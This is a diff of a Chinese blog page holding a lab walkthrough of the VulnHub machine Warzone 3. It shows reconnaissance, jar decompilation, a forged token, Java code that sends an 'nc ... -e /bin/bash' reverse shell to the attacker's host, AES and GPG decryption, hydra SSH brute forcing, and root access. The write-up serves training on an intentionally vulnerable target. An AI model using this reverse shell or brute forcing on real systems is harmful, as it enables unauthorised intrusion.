@@ -76,7 +76,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>4.7k</span>
+    <span>5k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/OpkYA94CeUZvRI5.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/vEcnkg9uhaCf3ey.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/42PBV1A3YGWyXN8.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/yxb6m3Ak4MhTNvU.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/OqYw1kD5yZdImSe.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wM1vF7Eipkbmzlg.jpg"></li>
           <li class="item" data-background-image="https://s2.loli.net/2023/04/01/RxL7bMZt5rslE68.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/vGCLbdJPMhuwg3H.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KopmzJq4geNSalr.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BCMkIXvxWUj69pG.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/5ZVSlaUgNvKo6bJ.jpg"></li>
         </ul>
       </div>
     </header>
@@ -170,103 +170,69 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 
     <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0=">https://www.vulnhub.com/entry/warzone-</span> 3 - exogen,606/<br>
  教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kNGtLaV9najR2aw==">https://www.youtube.com/watch?v=d4kKi_gj4vk</span></p>
-<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
-<p>攻击机 kali： 1 92.168. 0 .x (由于设置成了 DHCP、可能多变)<br>
- 靶机 WARZONE 3 ：桥接于 1 92.168. 0 .1 的网卡，ip 未知</p>
+<h3 id="确认攻击目标"><a class="markdownIt-Anchor" href="#确认攻击目标">#</a> 确认攻击目标</h3>
+<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>
+ 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知</p>
 <p>1 ）确定靶机 ip 地址和开放的端口<br>
 由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>
-sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq<br>
- 开靶机扫了一次，开靶机后扫了一次，得到靶机 ip 192.168.0.186</p>
+ <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>
+<p>开靶机前后各扫描一次，得到靶机 ip 192.168.0.186</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1432.png" alt></p>
-<h3 id="扫描靶机上开放的端口及详细信息"><a class="markdownIt-Anchor" href="#扫描靶机上开放的端口及详细信息">#</a> 扫描靶机上开放的端口及详细信息</h3>
-<p>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000</p>
+<p>2 ）扫描靶机上开放的端口及详细信息<br>
+ <code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1433.png" alt></p>
-<ul>
-<li>sV 表示扫描服务及版本信息</li>
-<li>sC 表示以默认的脚本进行扫描</li>
-<li>T 4 表示控制扫描的速度</li>
-<li>Pn 表示不用 ping 去扫描机器</li>
-<li>-open 表示只扫描开放的端口</li>
-<li>p- 表示扫描所有的端口</li>
-<li>-min-rate 设置最小的扫描速度</li>
-</ul>
-<h3 id="检索到的有效服务如下所示"><a class="markdownIt-Anchor" href="#检索到的有效服务如下所示">#</a> 检索到的有效服务如下所示：</h3>
-<p>21 ftp：可尝试进行匿名登陆下载文件<br>
+<blockquote>
+<p>nmap 参数说明<br>
+ - sV 表示扫描服务及版本信息<br>
+ - sC 表示以默认的脚本进行扫描<br>
+ - T 4 表示控制扫描的速度<br>
+ - Pn 表示不用 ping 去扫描机器<br>
+–open 表示只扫描开放的端口<br>
+ - p- 表示扫描所有的端口<br>
+–min-rate 设置最小的扫描速度</p>
+</blockquote>
+<blockquote>
+<p>检索到的有效服务如下所示：<br>
+21 ftp：可尝试进行匿名登陆下载文件<br>
  22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>
  4444 krb 524 ：未知端口</p>
-<h3 id="002-ftp匿名访问-jd-gui读jar文件sha-256-加密java解密"><a class="markdownIt-Anchor" href="#002-ftp匿名访问-jd-gui读jar文件sha-256-加密java解密">#</a> 002 ftp 匿名访问、jd-gui 读 jar 文件，SHA 256 加密，java 解密</h3>
+</blockquote>
+<h3 id="ftp-匿名访问"><a class="markdownIt-Anchor" href="#ftp-匿名访问">#</a> FTP 匿名访问</h3>
 <p>打开 <span class="exturl" data-url="ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=">ftp://192.168.0.186/</span> 进行 ftp 信息收集<br>
 有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1434.png" alt></p>
-<p>将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来<br>
-控制本地的目录</p>
-<p>note.txt 中提示 token 是 username 的 SHA 256 值<br>
-并且有一个邮箱是 alienum@exogenesis，即用户为 alienum</p>
+<p>将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来控制本地的目录</p>
+<p>note.txt 中提示 token 是 username 的 SHA 256 值，并且有一个邮箱是 alienum@exogenesis，即用户为 alienum</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1435.png" alt></p>
-<p>将下在后的 jar 文件，用 jd-gui 打开后查看源代码</p>
+<h3 id="java代码审计"><a class="markdownIt-Anchor" href="#java代码审计">#</a> java 代码审计</h3>
+<p>将下载后的 jar 文件，用 jd-gui 打开后查看源代码</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1436.png" alt></p>
-<p>RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转<br>
-变为字符串、get set 方法等</p>
+<p>RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转变为字符串、get set 方法等</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1437.png" alt></p>
 <p>Token 由 value 和 role 组成</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1438.png" alt></p>
 <p>在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1439.png" alt></p>
-<p>先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识<br>
-别不到 url 地址为 warzone.local</p>
+<p>先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识别不到 url 地址为 warzone.local</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1440.png" alt></p>
 <p>改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1441.png" alt></p>
-<p>并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来<br>
-说就应该是 alienum 用户的 TOKEN 值</p>
+<p>并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来说就应该是 alienum 用户的 TOKEN 值</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1442.png" alt></p>
 <p>也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256<br>
-echo -n “alienum” | shasum -a 256</p>
+ <code>echo -n &quot;alienum&quot; | shasum -a 256</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1443.png" alt></p>
 <p>6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec</p>
 <p>再次用 alienum 用户和他的 token 登陆发现爆了错误</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1444.png" alt></p>
-<p>在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以<br>
-绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA<br>
- 其他的两个文件不变，主函数改为下面的代码</p>
+<p>在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA 其他的两个文件不变，主函数改为下面的代码</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1445.png" alt></p>
-<p>package alien;</p>
-<p>import java.io.IOException;<br>
-import java.io.ObjectInputStream;<br>
-import java.io.ObjectOutputStream;<br>
-import java.net.Socket;</p>
-<p>public class Starter {<br>
-static Socket socket = null;<br>
-static ObjectOutputStream os;<br>
-static Token token;</p>
-<p>public static void main(String[] args) throws IOException,<br>
-ClassNotFoundException {<br>
-socket = new Socket(“warzone.local”, 4444);<br>
-os = new ObjectOutputStream(socket.getOutputStream());<br>
-token = new<br>
-Token(“6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec”,<br>
-“astronaut”);</p>
-<p>RE list = new RE();<br>
-list.setToken(token);<br>
-list.setOption(“VIEW”);<br>
-list.setValue(“VALUE”);<br>
-list.setCmd(“nc 192.168.0.168 4444 -e /bin/bash”);</p>
-<p>os.writeObject(list);<br>
-ObjectInputStream is = new ObjectInputStream(socket.getInputStream());<br>
-RE response = (RE) is.readObject();<br>
-os.close();<br>
-socket.close();<br>
-System.out.println(response.getValue());<br>
-}<br>
-}</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package alien;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.net.Socket;</span><br><span class="line"></span><br><span class="line">public class Starter &#123;</span><br><span class="line">	static Socket socket = null;</span><br><span class="line">	static ObjectOutputStream os;</span><br><span class="line">	static Token token;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">		socket = new Socket(&quot;warzone.local&quot;, 4444);</span><br><span class="line">		os = new ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">		token = new</span><br><span class="line">		Token(&quot;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&quot;, &quot;astronaut&quot;);</span><br><span class="line">		</span><br><span class="line">		RE list = new RE();</span><br><span class="line">		list.setToken(token);</span><br><span class="line">		list.setOption(&quot;VIEW&quot;);</span><br><span class="line">		list.setValue(&quot;VALUE&quot;);</span><br><span class="line">		list.setCmd(&quot;nc 192.168.0.168 4444 -e /bin/bash&quot;);</span><br><span class="line">		</span><br><span class="line">		os.writeObject(list);</span><br><span class="line">		ObjectInputStream is = new ObjectInputStream(socket.getInputStream());</span><br><span class="line">		RE response = (RE) is.readObject();</span><br><span class="line">		os.close();</span><br><span class="line">		socket.close();</span><br><span class="line">		System.out.println(response.getValue());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>执行之后 shell 成功反弹，拿到了 exomorph 的权限</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1446.png" alt></p>
-<h3 id="003-jar反编译java脚本解密aessshpass命令行连接靶机"><a class="markdownIt-Anchor" href="#003-jar反编译java脚本解密aessshpass命令行连接靶机">#</a> 003 jar 反编译，java 脚本解密 AES，sshpass 命令行连接靶机</h3>
-<p>标准化 tty 就不多说了<br>
- script -qc /bin/bash/dev/null<br>
-stty raw -echo;fg<br>
-export TERM=xterm;reset;stty rows 64 columns 118<br>
- 此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容</p>
+<h3 id="java脚本解密aes"><a class="markdownIt-Anchor" href="#java脚本解密aes">#</a> java 脚本解密 AES</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">标准化<span class="built_in">tty</span>就不多说了</span></span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">stty raw -echo;fg</span><br><span class="line">export TERM=xterm;reset;stty rows 64 columns 118</span><br></pre></td></tr></table></figure>
+<p>此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1447.png" alt></p>
 <p>得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1448.png" alt></p>
@@ -276,101 +242,58 @@ export TERM=xterm;reset;stty rows 64 columns 118<br>
 <p><img data-src="/N1h1l157/VULNHUB/image-1450.png" alt></p>
 <p>Main 函数定义要加密的 key，以及加密后的文件的路径</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1451.png" alt></p>
-<p>现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密<br>
-先定义解密函数，通过如下方法来调用<br>
- public static void decrypt (String key, File inputFile, File outputFile) throws<br>
-CryptoException {<br>
-doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);<br>
-}</p>
+<p>现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先定义解密函数，通过如下方法来调用</span></span><br><span class="line">public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException &#123;</span><br><span class="line">	doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-1452.png" alt></p>
-<h3 id="再来修改主函数密钥维持不变修改当前的解密文件内容和解密后的文件保"><a class="markdownIt-Anchor" href="#再来修改主函数密钥维持不变修改当前的解密文件内容和解密后的文件保">#</a> 再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保</h3>
-<h3 id="存路径并且调用解密方法最后将我们解密后的内容查看"><a class="markdownIt-Anchor" href="#存路径并且调用解密方法最后将我们解密后的内容查看">#</a> 存路径，并且调用解密方法，最后将我们解密后的内容查看</h3>
-<p>package alienum;</p>
-<p>import java.io.File;<br>
-import java.io.IOException;</p>
-<p>public class Main {<br>
-static String inputPath =<br>
-“/Users/chentuo/JavaProjects/alienum/aliens.encrypted”;</p>
-<p>static String outputPath = “/Users/chentuo/JavaProjects/alienum/aliens.txt”;</p>
-<p>public Main() {<br>
-}</p>
-<p>public static void main(String[] args) throws IOException,<br>
-ClassNotFoundException {<br>
-String key = “w4rz0nerex0gener”;<br>
-File inputFile = new File(inputPath);<br>
-File decryptedFile = new File(outputPath);</p>
-<p>try {<br>
-alienum.Cryptor.decrypt(key, inputFile, decryptedFile);<br>
-} catch (CryptoException var5) {<br>
-System.out.println(var5.getMessage());<br>
-var5.printStackTrace();<br>
-}</p>
-<h3 id><a class="markdownIt-Anchor" href="#">#</a> }</h3>
-<h3 id="-2"><a class="markdownIt-Anchor" href="#-2">#</a> }</h3>
+<p>再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保存路径，并且调用解密方法，最后将我们解密后的内容查看</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package alienum;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">	static String inputPath = &quot;/Users/chentuo/JavaProjects/alienum/aliens.encrypted&quot;;</span><br><span class="line">	static String outputPath = &quot;/Users/chentuo/JavaProjects/alienum/aliens.txt&quot;;</span><br><span class="line">	public Main() &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">		String key = &quot;w4rz0nerex0gener&quot;;</span><br><span class="line">		File inputFile = new File(inputPath);</span><br><span class="line">		File decryptedFile = new File(outputPath);</span><br><span class="line">		</span><br><span class="line">		try &#123;</span><br><span class="line">			alienum.Cryptor.decrypt(key, inputFile, decryptedFile);</span><br><span class="line">		&#125; catch (CryptoException var5) &#123;</span><br><span class="line">			System.out.println(var5.getMessage());</span><br><span class="line">			var5.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-1453.png" alt></p>
-<h3 id="运行此文件之后即可以在自己设置的目录下找到我们的解密文件但是这个解"><a class="markdownIt-Anchor" href="#运行此文件之后即可以在自己设置的目录下找到我们的解密文件但是这个解">#</a> 运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解</h3>
-<p>密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data<br>
- 类型后，用 strings 查看得到了解密后的文件内容<br>
+<blockquote>
+<p>运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data 类型后，用 strings 查看得到了解密后的文件内容<br>
  minotaur:m1nom1no…<br>
 scylla:scyscy…<br>
-echidna:ech1ech1…</p>
-<p>cyclops:cyccyc…<br>
+echidna:ech1ech1…<br>
+cyclops:cyccyc…<br>
 anunnaki:nak1nak1…<br>
 anunnaki:nak1nak2…<br>
 anunnaki:nakinaki…</p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1454.png" alt></p>
+<h3 id="sshpass-连接靶机"><a class="markdownIt-Anchor" href="#sshpass-连接靶机">#</a> sshpass 连接靶机</h3>
 <p>得到了一串用户名和密码的组合，可能是 ssh 的用户和密码<br>
- cat aliens.txt | cut -d ‘:’ -f 1 &gt; user.txt<br>
-cat aliens.txt | cut -d ‘:’ -f 2 &gt; pass.txt</p>
+ <code>cat aliens.txt | cut -d ':' -f 1 &gt; user.txt</code> <br>
+ <code>cat aliens.txt | cut -d ':' -f 2 &gt; pass.txt</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1455.png" alt></p>
-<h3 id="检查一下用户名和密码文件是否正确"><a class="markdownIt-Anchor" href="#检查一下用户名和密码文件是否正确">#</a> 检查一下用户名和密码文件是否正确</h3>
+<p>检查一下用户名和密码文件是否正确</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1456.png" alt><br>
 <img data-src="/N1h1l157/VULNHUB/image-1457.png" alt></p>
-<p>hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV</p>
+<p><code>hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1458.png" alt><br>
 <img data-src="/N1h1l157/VULNHUB/image-1459.png" alt></p>
 <p>用 ssh 成功连接到了靶机中</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1460.png" alt></p>
 <p>第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接<br>
- sshpass -p nak1nak1… ssh <span class="exturl" data-url="bWFpbHRvOmFudW5uYWtpQDE5Mi4xNjguMC4xODY=">anunnaki@192.168.0.186</span></p>
+ <code>sshpass -p nak1nak1.. ssh anunnaki@192.168.0.186</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1461.png" alt></p>
-<h3 id="004-gpg解密文件java源码分析编写java解密代码"><a class="markdownIt-Anchor" href="#004-gpg解密文件java源码分析编写java解密代码">#</a> 004 gpg 解密文件，java 源码分析，编写 java 解密代码</h3>
-<p>检索服务器文件，看到提示文件与一个 gpg 的加密文件<br>
- info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码</p>
+<h3 id="java代码分析"><a class="markdownIt-Anchor" href="#java代码分析">#</a> java 代码分析</h3>
+<p>检索服务器文件，看到提示文件与一个 gpg 的加密文件，info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1462.png" alt></p>
-<h3 id="然而直接解密是可以弹出来输入密码的界面的"><a class="markdownIt-Anchor" href="#然而直接解密是可以弹出来输入密码的界面的">#</a> 然而直接解密是可以弹出来输入密码的界面的，</h3>
-<p>输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件</p>
+<p>然而直接解密是可以弹出来输入密码的界面的，输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1463.png" alt></p>
-<p>同样的下载到本地，用 jd-gui 打开，开始阅读源码<br>
- Cryptor.class 里边定义了一个加、解密方法</p>
+<p>同样的下载到本地，用 jd-gui 打开，开始阅读源码，Cryptor.class 里边定义了一个加、解密方法</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1464.png" alt></p>
 <p>Main.class 中设有盐值，并且在条件判断正确时为打印 passwd</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1465.png" alt></p>
 <p>Recources.class 里边是一些加密的字符串</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1466.png" alt></p>
-<p>编写 java 代码，进行解密，代码内容如下<br>
- import java.security.NoSuchAlgorithmException;<br>
-import javax.crypto.BadPaddingException;<br>
-import javax.crypto.IllegalBlockSizeException;<br>
-import javax.crypto.NoSuchPaddingException;</p>
-<p>public class Main {<br>
-public static void main(String[] args) throws NoSuchPaddingException,<br>
-IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException {<br>
-Cryptor cryptor = new Cryptor();</p>
-<p>String plaintext = cryptor.decrypt(cryptor.decrypt(“pr0tect1on1smust”,<br>
-“/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=”),<br>
-“jJ2Mrz4wjZDMSPwDr6TolQ==”);<br>
-System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
-<p>}</p>
-<h3 id="-3"><a class="markdownIt-Anchor" href="#-3">#</a> }</h3>
+<p>编写 java 代码，进行解密，代码内容如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.security.NoSuchAlgorithmException;</span><br><span class="line">import javax.crypto.BadPaddingException;</span><br><span class="line">import javax.crypto.IllegalBlockSizeException;</span><br><span class="line">import javax.crypto.NoSuchPaddingException;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">	public static void main(String[] args) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException &#123;</span><br><span class="line">	Cryptor cryptor = new Cryptor();</span><br><span class="line">	</span><br><span class="line">	String plaintext = cryptor.decrypt(cryptor.decrypt(&quot;pr0tect1on1smust&quot;, &quot;/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=&quot;), &quot;jJ2Mrz4wjZDMSPwDr6TolQ==&quot;);</span><br><span class="line">	System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-1467.png" alt></p>
 <p>运行代码，成功解密出来了密码为 ufo_phosXEN</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1468.png" alt></p>
 <p>判断一下这个密码属于哪个用户，发现就是 root 用户的</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1469.png" alt></p>
-<ul>
-<li>-&gt; 成功拿到了 root 权限</li>
-</ul>
+<p>-&gt; 成功拿到了 root 权限</p>
 
       <div class="tags">
           <a href="/tags/VULNHUB-41-50/" rel="tag"><i class="ic i-tag"></i> VULNHUB 41-50</a>
@@ -385,7 +308,7 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-05 22:21:10" itemprop="dateModified" datetime="2023-07-05T22:21:10+08:00">2023-07-05</time>
+    <time title="修改时间：2023-07-06 21:37:28" itemprop="dateModified" datetime="2023-07-06T21:37:28+08:00">2023-07-06</time>
   </span>
   <span id="2021/11/01/VULNHUB/147 WARZONE3/" class="item leancloud_visitors" data-flag-title="VULNHUB 47 WARZONE3" title="阅读次数">
       <span class="icon">
@@ -448,20 +371,20 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/148%20GITROOT/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;OqYw1kD5yZdImSe.jpg" title="VULNHUB 48 GITROOT">
+  <a href="/2021/11/01/VULNHUB/143%20ORASI/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;UlDZRiq3gbE2evh.jpg" title="VULNHUB 43 ORASI">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 48 GITROOT</h3>
+  <h3>VULNHUB 43 ORASI</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/140%20LOOZ/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;ixAYytdZ8HLRET2.jpg" title="VULNHUB 40 LOOZ">
+  <a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;5ZVSlaUgNvKo6bJ.jpg" title="VULNHUB 42 DARKHOLE2">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 40 LOOZ</h3>
+  <h3>VULNHUB 42 DARKHOLE2</h3>
   </a>
 
     </div>
@@ -480,11 +403,11 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA%E4%B8%8A%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%8F%8A%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text"> 扫描靶机上开放的端口及详细信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E5%88%B0%E7%9A%84%E6%9C%89%E6%95%88%E6%9C%8D%E5%8A%A1%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA"><span class="toc-number">3.</span> <span class="toc-text"> 检索到的有效服务如下所示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 